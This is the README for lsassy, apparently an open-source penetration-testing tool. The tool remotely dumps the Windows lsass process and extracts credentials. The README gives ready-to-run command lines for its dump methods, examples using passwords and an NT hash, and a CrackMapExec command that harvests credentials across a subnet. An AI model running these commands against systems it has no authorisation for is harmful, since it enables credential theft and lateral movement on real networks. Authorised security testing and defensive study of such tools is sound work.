# lsassy

[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=1.0.0&x2=0)](https://pypi.org/project/lsassy/) [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)

![CME Module example](/assets/example.png)

Python library to remotely extract credentials.
This library uses [impacket](https://github.com/SecureAuthCorp/impacket) projects to remotely read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials.

| Chapters                                     | Description                                             |
|----------------------------------------------|---------------------------------------------------------|
| [Requirements](#requirements)                | Requirements to install lsassy from source              |
| [Basic Usage](#basic-usage)                  | Command line template for standalone version            |
| [Advanced Usage](#advanced)                  | Advanced usage (Dumping methods, execution methods, ...)|
| [CrackMapExec Module](#crackmapexec-module)  | Link to CrackMapExec module included in this repository |
| [Examples](#examples)                        | Command line examples for standalone and CME module     |
| [Installation](#installation)                | Installation commands from pip or from source           |
| [Issues](#issues)                            | Read this before creating an issue                      |
| [Acknowledgments](#acknowledgments)          | Kudos to these people and tools                         |

## Requirements

* Python >= 3.6
* [pypykatz](https://github.com/skelsec/pypykatz) >= 0.3.0
* [impacket](https://github.com/SecureAuthCorp/impacket)

## Basic Usage

```
lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target>
```

## Advanced

This tool can dump lsass in different ways.

### comsvcs.dll method (Default)

This method **only uses built-in Windows files** to extract remote credentials. It uses **minidump**
function from **comsvcs.dll** to dump **lsass** process. As this can only be done as **SYSTEM**, it creates a remote
task as **SYSTEM**, runs it and then deletes it.

```
lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target>
```

### Procdump method

This method uploads **procdump.exe** from SysInternals to dump **lsass** process. It will first try to execute
procdump using WMI, and if it fails it will create a remote task, execute it and delete it.

```
lsassy [--hashes [LM:]NT] -p /path/to/procdump.exe [<domain>/]<user>[:<password>]@<target>
```

### Remote parsing only

lsassy can parse an already dumped lsass process.

```
lsassy [--hashes [LM:]NT] --dumppath /share/path/to/dump.dmp [<domain>/]<user>[:<password>]@<target>
```

## CrackMapExec module

I wrote a CrackMapExec module that uses **lsassy** to extract credentials on compromised hosts

CrackMapExec module is in `cme` folder : [CME Module](/cme/)

## Examples

### lsassy

```bash
# RunDLL Method
lsassy adsec.local/jsnow:Winter_is_coming@dc01.adsec.local

# Procdump Method
lsassy -p /tmp/procdump.exe adsec.local/jsnow:Winter_is_coming@dc01.adsec.local

# Remote parsing only
lsassy --dumppath C$/Windows/Temp/lsass.dmp adsec.local/jsnow:Winter_is_coming@dc01.adsec.local

# NT Hash Authentication
lsassy --hashes 952c28bd2fd728898411b301475009b7 Administrator@desktop01.adsec.local
```

### CME Module

```
crackmapexec smb 10.0.0.0/24 -d adsec.local -u Administrator -p Passw0rd -M lsassy -o BLOODHOUND=True NEO4JPASS=bloodhound```
```

## Installation

### From pip

```
python3.7 -m pip install lsassy
```

### From sources

```
python3.7 setup.py install
```

### ChangeLog

```
v1.0.0
------
* Built-in lsass dump
** Lsass dump using built-in Windows
** Lsass dump using procdump (using -p parameter)
* Add --dumppath to ask for remote parsing only
* Code refactoring
* Add --quiet to quiet output

v0.2.0
------
* Add BloodHound option to CME module (-o BLOODHOUND=True)
    - Set compromised targets as "owned" in BloodHound
    - Check if compromised users have at least one path to domain admin
* Custom parsing (json, grep, pretty [default])
* New --hashes option to lsassy
* Include CME module in repository
* Add credentials to CME database


v0.1.0
------
First release
```

## Issues

If you find an issue with this tool (that's very plausible !), please

* Check that you're using the latest version
* Send as much details as possible.
    - For standalone **lsassy**, please use the `-d` debug flag
    - For CME module, please use CrackMapExec `--verbose` flag

## Acknowledgments

* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [SkelSec](http://twitter.com/skelsec) for Pypykatz, but also for his patience and help
* [mpgn](https://twitter.com/mpgn_x64) for his help and ideas
